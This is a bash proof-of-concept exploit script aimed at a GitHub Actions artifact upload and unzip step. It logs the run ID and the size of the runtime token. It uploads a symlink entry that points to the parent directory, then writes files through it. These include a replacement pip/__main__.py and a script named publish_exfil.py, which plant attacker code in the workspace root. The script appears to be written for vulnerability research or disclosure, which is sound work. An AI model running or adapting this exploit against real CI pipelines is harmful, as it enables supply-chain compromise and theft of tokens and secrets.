#!/bin/bash
set -u
exec 1>&2
echo "POC_PLANT_START os=$(uname -s) run=${GITHUB_RUN_ID:-} job=${GITHUB_JOB:-} repo=${GITHUB_REPOSITORY:-}"
echo "POC_ENV results_url=${ACTIONS_RESULTS_URL:-MISSING} runtime_token_len=${#ACTIONS_RUNTIME_TOKEN}"
if [ "$(uname -s)" != "Linux" ]; then
  echo "POC_PLANT_SKIP non-linux"
  exit 1
fi
if [ -f /tmp/poc_planted ]; then
  echo "POC_PLANT_SKIP already"
  exit 1
fi
touch /tmp/poc_planted
cd "$(dirname "$0")/.." || { echo "POC_CD_FAILED"; exit 1; }
echo "POC_CWD $(pwd)"
INPUT_NAME='.' INPUT_ENTRIES='[{"name":"p","content":"..","mode":41471}]' python3 poc/upload.py
echo "POC_UPLOAD_DOT_EXIT=$?"
sleep 2
INPUT_NAME='p' INPUT_ENTRIES='[{"name":"pip/__init__.py","content":"","mode":33188},{"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},{"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},{"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}]' python3 poc/upload.py
echo "POC_UPLOAD_P_EXIT=$?"
echo "POC_PLANT_DONE"
exit 1
